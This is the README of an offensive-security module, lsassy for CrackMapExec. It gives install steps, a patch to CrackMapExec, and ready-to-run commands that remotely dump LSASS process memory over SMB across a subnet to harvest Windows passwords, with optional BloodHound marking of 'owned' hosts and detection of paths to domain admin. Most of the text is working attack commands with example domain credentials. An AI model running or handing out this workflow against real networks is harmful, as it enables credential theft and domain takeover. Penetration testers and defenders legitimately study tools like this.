# lsassy CrackMapExec Module

This CME module uses **lsassy** to remotely extract lsass password, and optionnaly interacts with Bloodhound to **set compromised hosts as owned** and check if compromised users have a **path to domain admin**.

![CME Module example](/assets/cme_lsassy.gif)

## Requirements

* Python2.7
  - [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
* Python3.6+
  - [lsassy](https://github.com/Hackndo/lsassy/)


## Installation

* Clone git repo

From SSH: (Need Github account with ssh key)
```bash
git clone git@github.com:Hackndo/lsassy.git
```
From Https: (Without Github account)
```bash
git clone https://github.com/Hackndo/lsassy.git
```

* Copy `lsassy.py` in `[CrackMapExec Path]/cme/modules`
* Patch CrackMapExec file `cme > modules > smb > wmiexec.py` in `execute_handler` function: Replace `self.execute_fileless(data)` with `self.execute_remote(data)`. We need procdump output to be totally retrieved. This won't break anything in CME.
* Reinstall CrackMapExec using python2.7 `python setup.py install`

```bash
cd lsassy/cme
cp lsassy.py /opt/CrackMapExec/cme/modules/
cd /opt/CrackMapExec
python setup.py install
```

## Usage

```bash
cme smb 10.10.0.0/24 -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy
```

You can set BloodHound integration using `-o BLOODHOUND=True` flag. This flag enables different checks :
* Set "owned" on BloodHound computer nodes that are compromised
* Detect compromised users that have a **path to domain admin**

```bash
cme smb 10.10.0.0/24 -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy -o BLOODHOUND=True
```

You can check available options using

```
cme smb 10.10.0.0/24 -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy --options
[*] lsassy module options:

            TMP_DIR             Path where process dump should be saved on target system (default: C:\\Windows\\Temp\\)
            SHARE               Share to upload procdump and dump lsass (default: C$)
            PROCDUMP_PATH       Path where procdump.exe is on your system (default: /tmp/)
            PROCDUMP_EXE_NAME   Name of the procdump executable (default: procdump.exe)
            REMOTE_LSASS_DUMP   Name of the remote lsass dump (default: tmp.dmp)
            BLOODHOUND          Enable Bloodhound integration (default: false)
            NEO4JURI            URI for Neo4j database (default: 127.0.0.1)
            NEO4JPORT           Listeninfg port for Neo4j database (default: 7687)
            NEO4JUSER           Username for Neo4j database (default: 'neo4j')
            NEO4JPASS           Password for Neo4j database (default: 'neo4j')
            WITHOUT_EDGES       List of black listed edges (example: 'SQLAdmin,CanRDP', default: '')

```

Options can be set using

```bash
cme smb dc01.adsec.local -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy -o PROCDUMP_PATH='/home/pixis/Tools/' PROCDUMP_EXE_NAME='procdump.exe'
```

## Issue

If you find an issue with this tool (that's very plausible !), please

* Check that you're using the latest version
* Send as much details as possible.
    - For standalone **lsassy**, please use the `-d` debug flag
    - For CME module, please use CrackMapExec `--verbose` flag

Have fun
